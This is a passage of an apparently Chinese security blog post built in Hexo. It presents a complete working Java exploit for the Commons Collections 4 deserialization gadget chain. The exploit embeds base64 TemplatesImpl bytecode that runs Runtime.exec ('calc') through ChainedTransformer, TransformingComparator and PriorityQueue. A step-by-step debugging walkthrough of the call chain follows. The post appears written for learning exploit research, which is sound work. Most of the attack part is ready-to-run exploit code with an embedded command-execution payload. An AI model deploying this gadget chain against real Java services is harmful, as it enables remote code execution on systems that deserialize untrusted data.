+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">package main.java.cc4;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;//</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;//</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xml.internal.security.exceptions.Base64DecodingException;</span><br><span class="line">import org.apache.commons.collections4.Transformer;//</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;//</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;//</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;//</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;//</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;//</span><br><span class="line">import java.io.*;//</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;//</span><br><span class="line">import java.lang.reflect.InvocationTargetException;//</span><br><span class="line">import java.util.PriorityQueue;//</span><br><span class="line"></span><br><span class="line">public class cc4 &#123;</span><br><span class="line">    public static void main(String[] args) throws Base64DecodingException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException, InvocationTargetException, IOException &#123;</span><br><span class="line">        //构造恶意类TestTemplatesImpl转换为字节码并进行base64编码</span><br><span class="line">        byte[] bytes = Base64.decode(&quot;yv66vgAAADQAMgoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEABGNhbGMKAAgAEAwAEQASAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwcAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24KABMAFgwAFwAGAQAPcHJpbnRTdGFja1RyYWNlBwAZAQAfbWFpbi9qYXZhL2NjMi9UZXN0VGVtcGxhdGVzSW1wbAEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAEdGhpcwEAIUxtYWluL2phdmEvY2MyL1Rlc3RUZW1wbGF0ZXNJbXBsOwEADVN0YWNrTWFwVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEAIQAYAAIAAAAAAAMAAQAFAAYAAQAaAAAAfAACAAIAAAAWKrcAAbgABxINtgAPV6cACEwrtgAVsQABAAQADQAQABMAAwAbAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASABwAAAAWAAIAEQAEAB0AHgABAAAAFgAfACAAAAAhAAAAEAAC/wAQAAEHABgAAQcAEwQAAQAiACMAAgAaAAAAPwAAAAMAAAABsQAAAAIAGwAAAAYAAQAAABYAHAAAACAAAwAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAmACcAAgAoAAAABAABACkAAQAiACsAAgAaAAAASQAAAAQAAAABsQAAAAIAGwAAAAYAAQAAABoAHAAAACoABAAAAAEAHwAgAAAAAAABACQAJQABAAAAAQAsAC0AAgAAAAEALgAvAAMAKAAAAAQAAQApAAEAMAAAAAIAMQ==&quot;);</span><br><span class="line">        //反射创建TemplatesImpl</span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]&#123;&#125;);</span><br><span class="line">        Object TemplatesImpl_instance = constructor.newInstance();</span><br><span class="line">        //将恶意类的字节码设置给_bytecodes属性</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance , new byte[][]&#123;bytes&#125;);</span><br><span class="line">        //设置属性_name为恶意类名</span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);</span><br><span class="line"></span><br><span class="line">        //传递给TransformingComparator</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;TemplatesImpl_instance&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformer_comparator =new TransformingComparator(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2);</span><br><span class="line">        queue.add(1);</span><br><span class="line">        queue.add(1);</span><br><span class="line"></span><br><span class="line">        //设置comparator属性</span><br><span class="line">        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(queue,transformer_comparator);</span><br><span class="line"></span><br><span class="line">        //设置queue属性</span><br><span class="line">        field=queue.getClass().getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        //数组中必须添加2个元素</span><br><span class="line">        Object[] objects = new Object[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue,objects);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object object = ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>区别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;TemplatesImpl_instance&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        TransformingComparator transformer_comparator =new TransformingComparator(chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<h2 id="熟悉一下，再调试一遍"><a href="#熟悉一下，再调试一遍" class="headerlink" title="熟悉一下，再调试一遍"></a>熟悉一下，再调试一遍</h2><p>在PriorityQueue类的readObject方法作为入口点</p>
+<p><img src="https://ilikeoyt.github.io/image/cc44.bmp" alt="img"></p>
+<p>这个方法会调用到heapify()方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/cc45.bmp" alt="img"></p>
+<p>又会调用siftDown方法</p>
+<p><img src="https://ilikeoyt.github.io/image/cc46.bmp" alt="img"></p>
+<p>在这里如果<code>comparator</code>不为空，还会继续调用<code>siftDownUsingComparator</code>方法，<code>comparator</code>在这里是被修饰的<code>Transformer[]</code>数组。前面使用反射去进行设置的。继续跟进<code>siftDownUsingComparator</code>方法。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc47.png" alt="img"></p>
+<p>到了这一步后，就会调用<code>comparator</code>的<code>compare</code>方法，在前面使用到了<code>TransformingComparator</code>来修饰，所以调用到<code>TransformingComparator</code>的<code>compare</code>方法。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc48.png" alt="img"></p>
+<p>在被<code>TransformingComparator</code>修饰前，还使用了<code>ChainedTransformer</code>修饰器进行修饰，在<code>this.transformer</code>为<code>ChainedTransformer</code>的实例化对象。所以这里调用的是<code>ChainedTransformer</code>的<code>transform</code>。前面也提过该方法会遍历调用<code>Transformer[]</code>数组的<code>transform</code>方法。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc49.png" alt="img"></p>
+<p>在第一次遍历调用<code>transform</code>方法时i，因为前面<code>Transformer[]</code>存储的第一个是<code>ConstantTransformer</code>。<code>ConstantTransformer</code>的<code>transform</code>会直接返回<code>TrAXFilter</code>对象。</p>
+<p>第二次调用的时候则是传入<code>TrAXFilter</code>调用<code>InstantiateTransformer</code>的<code>transform</code>方法。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc410.png" alt="img"></p>
+<p>这里的<code>this.iParamTypes</code>为<code>templates</code>,而<code>this.iArgs</code>为构造的恶意<code>TemplatesImpl</code>实例化对象。</p>
+<p>那么这一步就是获取<code>TrAXFilter</code>为<code>templates</code>的构造方法。然后调用该构造方法实例化对象，并且传入<code>TemplatesImpl</code>恶意类。跟进到<code>TrAXFilter</code>构造方法里面，查看一下具体实现。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc411.png" alt="img"></p>
+<p>在他的构造方法里面还会对传入的对象调用<code>newTransformer</code>方法。</p>
+<p>此时传入的是恶意的<code>TemplatesImpl</code>实例化对象。调用的则是<code>TemplatesImpl</code>的<code>newTransformer</code>方法。继续跟进。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc412.png" alt="img"></p>
+<p>在该方法还会调用到<code>getTransletInstance</code>方法。继续跟进。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc413.png" alt="img"></p>
+<p>到了这里会判断<code>_class</code>为空的话就会去调用<code>defineTransletClasses</code>进行赋值。跟踪一下<code>defineTransletClasses</code>方法查看是如何赋值的。</p>
+<p><img src="https://ilikeoyt.github.io/image/cc414.png" alt="img"></p>
+<p><code>_bytecodes</code>对<code>_class</code>进行赋值。<code>_bytecodes</code>为<code>Runtime</code>类执行命令代码的字节码。</p>
+<p>在执行完方法后，来到下一步。</p>
+<p>对<code>_class</code>进行<code>newInstance</code>，进行实例化对象。执行完这一步后，就会弹出计算器，也就是说执行了我们前面构造好的命令执行代码。</p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/14/DC-2/"> DC-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/07/19/java-cc%E9%93%BE5/">java_cc链5 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/19/java-cc%E9%93%BE5/" rel="prev" title="java_cc链5">
+      <i class="fa fa-chevron-left"></i> java_cc链5
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/21/java-CommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE/" rel="next" title="java_CommonsBeanutils1利用链">
+      java_CommonsBeanutils1利用链 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">2.</span> <span class="nav-text">调用栈</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E6%A0%B9%E6%8D%AEcc2%E9%93%BE%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9"><span class="nav-number">3.</span> <span class="nav-text">尝试根据cc2链进行修改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">4.</span> <span class="nav-text">完整exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%86%9F%E6%82%89%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%86%8D%E8%B0%83%E8%AF%95%E4%B8%80%E9%81%8D"><span class="nav-number">5.</span> <span class="nav-text">熟悉一下，再调试一遍</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
